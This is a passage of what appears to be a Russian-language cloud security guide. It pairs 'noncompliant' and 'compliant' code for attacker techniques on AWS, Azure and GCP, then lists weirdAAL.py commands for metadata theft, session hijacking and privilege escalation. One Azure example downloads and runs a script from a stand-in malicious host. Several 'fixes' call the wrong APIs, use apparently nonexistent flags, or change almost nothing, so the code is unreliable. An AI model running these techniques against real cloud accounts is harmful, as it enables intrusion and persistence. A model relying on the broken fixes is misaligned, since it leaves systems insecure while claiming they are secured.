    response = lambda_client.update_function_code(
        FunctionName=function_name,
        ZipFile=new_code
    )
    print("Lambda function code overwritten successfully.")

# Использование
overwrite_lambda_code('my-function', '/path/to/new_code.zip')
```

Несоответствующий код использует метод update_function_code AWS SDK для перезаписи кода функции Lambda. Он считывает новый код из файла и обновляет код функции Lambda предоставленным кодом. Этот код не учитывает лучшие практики безопасности, такие как надлежащая авторизация, проверка целостности кода и версионирование.

Соответствующий код:
Следующий совместимый код демонстрирует перезапись кода функции Lambda, следуя лучшим практикам безопасности:

```
import boto3

def overwrite_lambda_code(function_name, new_code_path):
    lambda_client = boto3.client('lambda')
    with open(new_code_path, 'rb') as file:
        new_code = file.read()
    response = lambda_client.update_function_code(
        FunctionName=function_name,
        ZipFile=new_code,
        Publish=True
    )
    if response['ResponseMetadata']['HTTPStatusCode'] == 200:
        print("Lambda function code overwritten successfully.")
    else:
        print("Failed to overwrite Lambda function code.")

# Использование
overwrite_lambda_code('my-function', '/path/to/new_code.zip')
```


## Создание якоря доверия IAM Roles Anywhere

Создание якоря доверия IAM Roles Anywhere включает в себя создание постоянства путем создания сертификата якоря доверия, который позволяет рабочим нагрузкам за пределами AWS принимать роли IAM через службу IAM Roles Anywhere.

Несоответствующий код:
Следующий код, не соответствующий требованиям, демонстрирует создание якоря доверия IAM Roles Anywhere без соблюдения лучших практик безопасности:

```
import boto3

def create_roles_anywhere_trust_anchor(role_name, trust_anchor_certificate):
    iam_client = boto3.client('iam')
    response = iam_client.create_service_specific_credential(
        UserName=role_name,
        ServiceName='roles-anywhere.amazonaws.com'
    )
    print("IAM Roles Anywhere trust anchor created successfully.")
    return response['ServiceSpecificCredential']

# Использование
create_roles_anywhere_trust_anchor('my-role', '-----BEGIN CERTIFICATE-----\n...\n-----END CERTIFICATE-----')
```

Несоответствующий код использует метод create_service_specific_credential в AWS SDK для создания якоря доверия IAM Roles Anywhere. В нем указывается роль IAM и имя службы roles-anywhere.amazonaws.com. Однако этот код не учитывает лучшие практики безопасности, такие как правильная авторизация, безопасная работа с сертификатом якоря доверия и принципы наименьших привилегий.


Соответствующий код:
Следующий код, соответствующий требованиям, демонстрирует создание якоря доверия IAM Roles Anywhere с соблюдением лучших практик безопасности:

```
import boto3

def create_roles_anywhere_trust_anchor(role_name, trust_anchor_certificate):
    iam_client = boto3.client('iam')
    response = iam_client.upload_signing_certificate(
        UserName=role_name,
        CertificateBody=trust_anchor_certificate
    )
    print("IAM Roles Anywhere trust anchor created successfully.")
    return response['Certificate']

# Использование
create_roles_anywhere_trust_anchor('my-role', '-----BEGIN CERTIFICATE-----\n...\n-----END CERTIFICATE-----')
```



## Выполнение команды на виртуальной машине с помощью расширения Custom Script Extension

Выполнение команды на виртуальной машине с помощью расширения Custom Script Extension в Azure позволяет злоумышленнику передать виртуальной машине команды PowerShell в виде SYSTEM, что дает ему возможность выполнять несанкционированные действия.

Несоответствующий код:
Следующий код, не соответствующий требованиям, демонстрирует выполнение команды на виртуальной машине с помощью расширения Custom Script Extension без соблюдения лучших практик безопасности:

```
{
  "type": "Microsoft.Compute/virtualMachines/extensions",
  "name": "CustomScriptExtension",
  "apiVersion": "2020-12-01",
  "location": "<vm-location>",
  "properties": {
    "publisher": "Microsoft.Compute",
    "type": "CustomScriptExtension",
    "typeHandlerVersion": "1.10",
    "autoUpgradeMinorVersion": true,
    "settings": {
      "fileUris": ["https://malicious-site.com/malicious-script.ps1"],
      "commandToExecute": "powershell.exe -ExecutionPolicy Bypass -File malicious-script.ps1"
    }
  }
}
```

Несоответствующий код напрямую ссылается на вредоносный скрипт, размещенный на удаленном сайте, и выполняет его на виртуальной машине без учета лучших практик безопасности.

Соответствующий код:
Следующий код, соответствующий требованиям, демонстрирует выполнение команды на виртуальной машине с помощью расширения Custom Script Extension, соблюдая при этом передовые методы обеспечения безопасности:

```
{
  "type": "Microsoft.Compute/virtualMachines/extensions",
  "name": "CustomScriptExtension",
  "apiVersion": "2020-12-01",
  "location": "<vm-location>",
  "properties": {
    "publisher": "Microsoft.Compute",
    "type": "CustomScriptExtension",
    "typeHandlerVersion": "1.10",
    "autoUpgradeMinorVersion": true,
    "settings": {
      "fileUris": ["https://secure-site.com/secure-script.ps1"],
      "commandToExecute": "powershell.exe -ExecutionPolicy RemoteSigned -File secure-script.ps1"
    },
    "protectedSettings": {
      "storageAccountName": "<storage-account-name>",
      "storageAccountKey": "<storage-account-key>"
    }
  }
}
```


## Выполнение команд на виртуальной машине с помощью Run Command

Выполнение команд на виртуальной машине с помощью функции Run Command в Azure позволяет злоумышленнику передавать команды PowerShell (Windows) или shell (Linux) на виртуальную машину с повышенными привилегиями.

Несоответствующий код:
Следующий код, не соответствующий требованиям, демонстрирует выполнение команды на виртуальной машине с помощью функции Run Command без соблюдения лучших практик безопасности:

```
{
  "location": "<vm-location>",
  "properties": {
    "commandId": "RunPowerShellScript",
    "script": "<malicious-script>",
    "timeoutInSeconds": 60
  }
}
```

Несоответствующий требованиям код напрямую выполняет вредоносный скрипт без учета передовых методов обеспечения безопасности. В нем отсутствует надлежащая проверка и контроль над содержимым скрипта, что может привести к несанкционированным или вредоносным действиям.

Соответствующий код:
Следующий код, соответствующий требованиям, демонстрирует выполнение команд на виртуальной машине с помощью функции Run Command, соблюдая при этом передовые методы обеспечения безопасности:

```
{
  "location": "<vm-location>",
  "properties": {
    "commandId": "RunPowerShellScript",
    "script": "<secure-script>",
    "timeoutInSeconds": 60,
    "parameters": []
  }
}
```

## Экспорт диска через URL-адрес SAS


Экспорт диска через URL-адрес SAS (Shared Access Signature) в Azure позволяет злоумышленнику сгенерировать общедоступный URL-адрес, который можно использовать для загрузки диска Azure, что способствует утечке данных.

Несоответствующий код:
Следующий код, не соответствующий требованиям, демонстрирует экспорт диска через URL-адрес SAS без соблюдения лучших практик безопасности:

```
from azure.storage.blob import BlobServiceClient

def export_disk_to_sas_url(disk_name, container_name, storage_account_name, storage_account_key):
    blob_service_client = BlobServiceClient(account_url=f"https://{storage_account_name}.blob.core.windows.net", credential=storage_account_key)
    container_client = blob_service_client.get_container_client(container_name)

    sas_url = container_client.get_blob_client(disk_name).url + '?' + container_client.generate_shared_access_signature(permission='r', expiry='2030-01-01')

    return sas_url
```

Несоответствующий требованиям код генерирует URL-адрес SAS для диска без учета передовых методов обеспечения безопасности. В нем отсутствуют надлежащая проверка, контроль доступа и ограничения, что делает диск доступным для всех, у кого есть URL. Это может привести к несанкционированному доступу и утечке данных.

Соответствующий код:
Следующий код, соответствующий требованиям, демонстрирует экспорт диска через URL-адрес SAS с соблюдением лучших практик безопасности:

```
from azure.storage.blob import BlobServiceClient, BlobSasPermissions, generate_blob_sas
from datetime import datetime, timedelta

def export_disk_to_sas_url(disk_name, container_name, storage_account_name, storage_account_key):
    blob_service_client = BlobServiceClient(account_url=f"https://{storage_account_name}.blob.core.windows.net", credential=storage_account_key)
    container_client = blob_service_client.get_container_client(container_name)

    expiry_time = datetime.utcnow() + timedelta(days=7)
    permissions = BlobSasPermissions(read=True)

    sas_url = container_client.get_blob_client(disk_name).url + '?' + generate_blob_sas(
        container_client.account_name,
        container_client.container_name,
        container_client.blob_name,
        account_key=container_client.credential.account_key,
        permission=permissions,
        expiry=expiry_time
    )

    return sas_url
```



## Создание учетной записи службы администратора GCP

Создание учетной записи администратора GCP Service Account подразумевает создание постоянства путем создания новой учетной записи службы и предоставления ей прав владельца в текущем GCP-проекте. Это позволяет злоумышленнику повысить привилегии и сохранить долгосрочный контроль над проектом.

Несоответствующий код:

Следующий код, не отвечающий требованиям, демонстрирует создание учетной записи службы администратора GCP без соблюдения лучших практик безопасности:

```
#!/bin/bash

# Создайте новую учетную запись службы
gcloud iam service-accounts create admin-account --display-name="Admin Service Account"

# Назначьте роль владельца учетной записи службы
gcloud projects add-iam-policy-binding <project-id> --member="serviceAccount:admin-account@<project-id>.iam.gserviceaccount.com" --role="roles/owner"
```

Несоответствующий код создает новую учетную запись службы с именем "admin-account" и назначает ей роль владельца непосредственно в проекте. В этом подходе отсутствует надлежащий контроль доступа, принципы наименьших привилегий и разделение обязанностей, что дает чрезмерные привилегии служебной учетной записи.

Соответствующий код:
Следующий код, соответствующий требованиям, демонстрирует создание учетной записи службы admin GCP с соблюдением лучших практик безопасности:

```
#!/bin/bash

# Создайте новую учетную запись службы
gcloud iam service-accounts create admin-account --display-name="Admin Service Account"

# Предоставьте минимально необходимые разрешения учетной записи службы
gcloud projects add-iam-policy-binding <project-id> --member="serviceAccount:admin-account@<project-id>.iam.gserviceaccount.com" --role="roles/viewer"

# Делегируйте назначение роли владельца отдельной привилегированной учетной записи
gcloud projects add-iam-policy-binding <project-id> --member="user:privileged-user@domain.com" --role="roles/iam.serviceAccountAdmin"
gcloud iam service-accounts add-iam-policy-binding admin-account@<project-id>.iam.gserviceaccount.com --member="user:privileged-user@domain.com" --role="roles/iam.serviceAccountUser"
```


## Создание ключа учетной записи службы GCP

Создание ключа учетной записи службы GCP подразумевает генерацию ключа для существующей учетной записи службы, который может использоваться для аутентификации и доступа к ресурсам в рамках связанного проекта GCP. Это действие обычно используется для создания постоянства и потенциальной эскалации привилегий.

Несоответствующий код:
Следующий код, не соответствующий требованиям, демонстрирует создание ключа учетной записи службы без соблюдения лучших практик безопасности:

```
#!/bin/bash

# Создайте новый ключ учетной записи службы
gcloud iam service-accounts keys create key.json --iam-account=<service-account-email>
```

Несоответствующий код генерирует ключ учетной записи службы с помощью команды gcloud iam service-accounts keys create. Однако в нем отсутствуют надлежащие средства контроля безопасности и не соблюдаются рекомендуемые практики.

Соответствующий код:
Следующий код, соответствующий требованиям, демонстрирует создание ключа учетной записи службы, следуя лучшим практикам безопасности:

```
#!/bin/bash

# Создайте новый ключ учетной записи службы с ограниченными правами
gcloud iam service-accounts keys create key.json --iam-account=<service-account-email> --key-type=json --project=<project-id> --private-key-type=rsa --private-key-algorithm=rsa-sha256 --validity-period=<duration>

# Надежно храните сгенерированный ключ
# ...
```

## Имитировать учетные записи служб GCP

Имитировать учетные записи служб GCP - это техника повышения привилегий, которая позволяет злоумышленнику получить временные учетные данные и действовать в качестве учетной записи службы в проекте GCP. Выдавая себя за учетную запись службы, злоумышленник может получить повышенные привилегии и доступ к важным ресурсам.

Несоответствующий код:
Следующий код, не соответствующий требованиям, демонстрирует попытку выдать себя за учетную запись службы GCP без соблюдения лучших практик безопасности:

```
from google.auth import impersonated_credentials
from google.auth.transport.requests import Request
from google.oauth2 import service_account

# Учетные данные учетной записи сервиса для текущего пользователя с ролью 'iam.serviceAccountTokenCreator'
credentials = service_account.Credentials.from_service_account_file('user-credentials.json')

# Список адресов электронной почты учетных записей служб, за которые нужно имитировать
service_account_emails = ['service-account1@project-id.iam.gserviceaccount.com', 'service-account2@project-id.iam.gserviceaccount.com']

# Имитировать учетную запись каждой службы и получайте временные учетные данные
for email in service_account_emails:
    target_credentials = impersonated_credentials.Credentials(credentials, target_principal=email, target_scopes=['https://www.googleapis.com/auth/cloud-platform'])
    target_credentials.refresh(Request())
    # Используйте target_credentials для дальнейших действий
```

Несоответствующий требованиям код пытается выдать себя за учетную запись службы GCP без применения надлежащих средств контроля безопасности. Для имперсонации используется библиотека google-auth. Однако в нем отсутствуют такие важные элементы безопасности, как проверка и мониторинг.

Соответствующий код:
Следующий код, соответствующий требованиям, демонстрирует более безопасный подход к имитации учетной записи службы GCP:

```
from google.auth import impersonated_credentials
from google.auth.transport.requests import Request
from google.oauth2 import service_account

# Учетные данные учетной записи сервиса для текущего пользователя с ролью 'iam.serviceAccountTokenCreator'
credentials = service_account.Credentials.from_service_account_file('user-credentials.json')

# Список адресов электронной почты учетных записей служб, за которые нужно  имитировать
service_account_emails = ['service-account1@project-id.iam.gserviceaccount.com', 'service-account2@project-id.iam.gserviceaccount.com']

# Имитировать учетную запись каждой службы и получайте временные учетные данные
for email in service_account_emails:
    try:
        target_credentials = impersonated_credentials.Credentials(credentials, target_principal=email, target_scopes=['https://www.googleapis.com/auth/cloud-platform'])
        target_credentials.refresh(Request())
        # Используйте target_credentials для дальнейших действий
    except Exception as e:
        # Handle impersonation failure, e.g., log the event or trigger an alert
        print(f"Impersonation of {email} failed: {str(e)}")
```



## Перечисление кросс-аккаунтов AWS

```
weirdAAL.py cross_account_enum
```

## Повышение привилегий с помощью метаданных EC2   

```
weirdAAL.py ec2_metadata
```

## Перечисление параметров AWS Systems Manager   

```
weirdAAL.py ssm_enum
```

## Перечисление экземпляров EC2 с общедоступными IP-адресами   

```
weirdAAL.py public_ec2_enum
```

## Кража метаданных экземпляра EC2  

```
weirdAAL.py steal_metadata
```

## Повышение привилегий путем присоединения профиля экземпляра EC2   

```
weirdAAL.py attach_instance_profile
```

## Перечисление сред Elastic Beanstalk с открытым доступом    

```
weirdAAL.py public_eb_enum
```

## Повышение привилегий путем перехвата сеансов AWS CLI 

```
weirdAAL.py hijack_cli
```

## Перечисление репозиториев ECR с открытым доступом  

```
weirdAAL.py public_ecr_enum
```

## Повышение привилегий путем перехвата сеансов AWS SDK 

```
weirdAAL.py hijack_sdk
```

## Перечисление кластеров и служб ECS    

```
weirdAAL.py ecs_enum
```

## Повышение привилегий с помощью сеансов присвоения роли 

```
weirdAAL.py assume_role
```

## Перечисление баз данных AWS Glue Data Catalog 

```
weirdAAL.py glue_enum
```

## Повышение привилегий путем захвата экземпляра EC2  

```
weirdAAL.py ec2_takeover
```

## Перечисление открытых ведер S3 и их содержимого   

```
weirdAAL.py s3_enum --list-objects
```

## Повышение привилегий через учетные данные базы данных RDS   

weirdAAL.py rds_priv_esc

## Перечисление кластеров EKS и связанных с ними ресурсов    

```
weirdAAL.py eks_enum
```

## Повышение привилегий путем изменения ключевой политики KMS   

```
weirdAAL.py kms_priv_esc
```





